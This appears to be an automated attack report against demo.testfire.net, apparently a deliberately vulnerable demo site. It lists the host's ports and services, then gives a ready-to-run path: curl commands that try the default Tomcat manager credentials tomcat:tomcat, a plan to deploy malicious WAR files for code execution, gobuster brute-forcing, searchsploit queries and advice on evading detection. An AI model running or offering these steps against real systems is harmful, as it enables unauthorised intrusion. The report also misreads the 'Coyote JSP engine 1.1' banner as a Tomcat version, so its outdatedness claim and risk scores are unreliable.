# 🎯 TARGET: demo.testfire.net

**Fri Mar 20 18:52:38 +06 2026**

--- SURFACE ---

* **Hosts:** demo.testfire.net
* **Live:** https://demo.testfire.net
* **Ports:** 80, 443, 8080
* **Services:**
    * 80 → http → Apache Tomcat/Coyote JSP engine 1.1
    * 443 → ssl/https? → unknown
    * 8080 → http → Apache Tomcat/Coyote JSP engine 1.1--- FINDINGS ---

--- ATTACK PATHS ---

**Entry vector:** Tomcat Manager Default Credentials

**why:** Apache Tomcat 1.1 may retain default credentials (tomcat:tomcat) for the manager application, enabling unauthenticated access if unchanged.

**step 1:** Access the manager interface at http://demo.testfire.net:8080/manager/html

**step 2:** Authenticate using default credentials (tomcat:tomcat)

**outcome:** Successful login allows deployment of malicious WAR files, resulting in remote code execution.

**confidence:** Medium (default credentials are prevalent in legacy installations but may have been modified post-deployment)

--- INITIAL EXPLOIT COMMANDS ---

**Goal:** Verify Tomcat manager application accessibility
```bashcurl -v http://demo.testfire.net:8080/manager/html
```
**note:** Observe HTTP 200 OK with login prompt or 401 Unauthorized indicating auth requirement.

**Goal:** Attempt authentication with default Tomcat credentials
```bash
curl -v -u 'tomcat:tomcat' http://demo.testfire.net:8080/manager/html
```
**note:** HTTP 200 OK with Tomcat Manager dashboard confirms successful login.

--- TOOLING SUGGESTIONS ---

* **Tool:** nikto | **use:** Comprehensive web server vulnerability scanning | **target:** demo.testfire.net:8080 | **templates:** n/a

--- SEARCHSPLOIT QUICK HITS ---

```bash
searchsploit Apache Tomcat 1.1
searchsploit Coyote JSP engine 1.1
```

--- NEXT MOVES ---

* **Enumerate:** Check for exposed Tomcat applications and directories via brute-forcing (no credentials) using:
```bash
gobuster dir -u http://demo.testfire.net:8080 -w /usr/share/wordlists/dirb/common.txt -x jsp,html,asp,aspx```
* **Validate:** Confirm server header and version to verify Tomcat presence:
```bash
curl -I http://demo.testfire.net:8080 2>/dev/null | grep -i server
```
* ** Probe:** Test manager login with default credentials and check for success:
```bash
curl -s -u 'tomcat:tomcat' http://demo.testfire.net:8080/manager/html | grep -i "Tomcat Manager" && echo "Login successful" || echo "Login failed"
```

--- OPSEC ---

* **noise:** medium (web requests and brute-forcing generate detectable logs)
* **loud actions:** Directory brute-forcing and repeated authentication attempts
* **stealthier alt:** Passive OSINT via SSL certificate transparency logs and search engine caching

--- PWNABILITY SCORE ---

| Metric | Score | Reason |
| :--- | :--- | :--- |
| **Exposure** | 18 | Multiple web services (HTTP/HTTPS) on standard and alt ports increase attack surface |
| **Service Risk** | 20 | Apache Tomcat 1.1 is outdated (2000-era) with inherent security weaknesses |
| **Vulnerabilities** | 12 | No specific CVEs provided, but version is known to have multiple flaws; conservative estimate due to lack of vuln data |
| **Exploitability** | 14 | Default credentials offer low-complexity access if present; requires guessing if changed |
| **Complexity** | 10 | Multi-step attack (access → auth → deploy) but each step is trivial with credentials |

**TOTAL:** 74/100
**RATING:** 🟠 High
**Reason:** Target exposes legacy Tomcat services with high likelihood of misconfigurations. Absence of specific CVE data reduces certainty, but outdated version and common default credentials create a viable exploit path with moderate complexity.

--- TL;DR ---
Outdated Tomcat server exposed with potential default credential access leading to RCE.

--- OUTRO ---
Another day, another legacy Java app begging to be pwned.